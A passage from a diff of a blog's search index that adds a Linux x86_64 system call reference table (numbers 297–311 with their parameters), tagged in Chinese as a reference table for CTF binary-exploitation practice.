+unsigned long pos_h
+
+
+
+297.
+sys_rt_tgsigqueueinfo
+297.
+pid_t tgid
+pid_t pid
+int sig
+siginfo_t *uinfo
+
+
+
+
+298.
+sys_perf_event_open
+298.
+struct perf_event_attr *attr_uptr
+pid_t pid
+int cpu
+int group_fd
+unsigned long flags
+
+
+
+299.
+sys_recvmmsg
+299.
+int fd
+struct msghdr *mmsg
+unsigned int vlen
+unsigned int flags
+struct timespec *timeout
+
+
+
+300.
+sys_fanotify_init
+300.
+unsigned int flags
+unsigned int event_f_flags
+
+
+
+
+
+
+301.
+sys_fanotify_mark
+301.
+long fanotify_fd
+long flags
+__u64 mask
+long dfd
+long pathname
+
+
+
+302.
+sys_prlimit64
+302.
+pid_t pid
+unsigned int resource
+const struct rlimit64 *new_rlim
+struct rlimit64 *old_rlim
+
+
+
+
+303.
+sys_name_to_handle_at
+303.
+int dfd
+const char *name
+struct file_handle *handle
+int *mnt_id
+int flag
+
+
+
+304.
+sys_open_by_handle_at
+304.
+int dfd
+const char *name
+struct file_handle *handle
+int *mnt_id
+int flags
+
+
+
+305.
+sys_clock_adjtime
+305.
+clockid_t which_clock
+struct timex *tx
+
+
+
+
+
+
+306.
+sys_syncfs
+306.
+int fd
+
+
+
+
+
+
+
+307.
+sys_sendmmsg
+307.
+int fd
+struct mmsghdr *mmsg
+unsigned int vlen
+unsigned int flags
+
+
+
+
+308.
+sys_setns
+308.
+int fd
+int nstype
+
+
+
+
+
+
+309.
+sys_getcpu
+309.
+unsigned *cpup
+unsigned *nodep
+struct getcpu_cache *unused
+
+
+
+
+
+310.
+sys_process_vm_readv
+310.
+pid_t pid
+const struct iovec *lvec
+unsigned long liovcnt
+const struct iovec *rvec
+unsigned long riovcnt
+unsigned long flags
+
+
+311.
+sys_process_vm_writev
+311.
+pid_t pid
+const struct iovec *lvec
+unsigned long liovcnt
+const struct iovcc *rvec
+unsigned long riovcnt
+unsigned long flags
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+</search>
